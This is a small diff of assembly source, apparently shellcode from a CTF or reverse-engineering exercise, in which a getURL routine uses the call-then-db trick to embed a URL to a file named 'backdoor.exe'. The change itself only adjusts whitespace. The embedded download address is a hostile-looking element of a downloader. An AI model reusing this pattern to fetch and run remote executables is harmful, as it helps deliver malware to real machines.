@@ -145,5 +145,6 @@ returnURL :
 
 getURL : 
     call returnURL 
-    db "https://github.com/hacmao/hacmao.github.io/raw/master/re/ctf/backdoor.exe"  
+    db "https://github.com/hacmao/hacmao.github.io/raw/master/re/ctf/backdoor.exe"
+
 
